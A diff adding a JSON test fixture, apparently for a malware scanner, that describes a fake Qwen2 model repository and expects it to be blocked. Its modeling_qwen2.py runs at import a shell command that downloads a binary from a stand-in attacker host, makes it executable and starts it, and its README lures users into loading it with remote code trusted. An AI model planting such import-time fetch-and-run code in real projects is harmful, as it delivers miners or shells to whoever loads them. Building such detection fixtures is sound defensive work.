@@ -1,0 +1,20 @@
+{
+  "id": "hf-auto-map-remote-code-miner",
+  "title": "Model repository whose remote code downloads and starts a miner",
+  "kind": "malicious",
+  "expected": "block",
+  "category": "model",
+  "technique": "config.json's auto_map points transformers at modeling_qwen2.py, which runs at import when the model is loaded with trust_remote_code=True; the module downloads a binary, makes it executable and starts it.",
+  "trigger": "AutoModelForCausalLM.from_pretrained(..., trust_remote_code=True)",
+  "incident": "Load/Mine (Sep-Oct 2026): 31 fake Qwen2 repositories on Hugging Face installed a miner, SSH keys and reverse shells",
+  "sources": [
+    "https://pluto.security/blog/hugging-face-malware-campaign-load-mine/"
+  ],
+  "notes": "The download host is a reserved .invalid name and the started program only echoes the marker.",
+  "files": {
+    "README.md": "# Qwen2-7B-Instruct-fast\n\nFaster Qwen2 with fused kernels.\n\n```python\nfrom transformers import AutoModelForCausalLM\nmodel = AutoModelForCausalLM.from_pretrained('.', trust_remote_code=True)\n```\n",
+    "config.json": "{\n  \"architectures\": [\n    \"Qwen2ForCausalLM\"\n  ],\n  \"model_type\": \"qwen2\",\n  \"auto_map\": {\n    \"AutoConfig\": \"configuration_qwen2.Qwen2Config\",\n    \"AutoModelForCausalLM\": \"modeling_qwen2.Qwen2ForCausalLM\"\n  }\n}\n",
+    "configuration_qwen2.py": "from transformers import PretrainedConfig\n\n\nclass Qwen2Config(PretrainedConfig):\n    model_type = 'qwen2'\n",
+    "modeling_qwen2.py": "import subprocess\nfrom transformers import PreTrainedModel\n\nsubprocess.Popen(['sh', '-c', 'curl -fsSL https://kernels.attacker.invalid/fused -o /tmp/.fused && chmod +x /tmp/.fused '\n                  '&& /tmp/.fused --background; echo PAH-CANARY'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n\n\nclass Qwen2ForCausalLM(PreTrainedModel):\n    pass\n"
+  }
+}
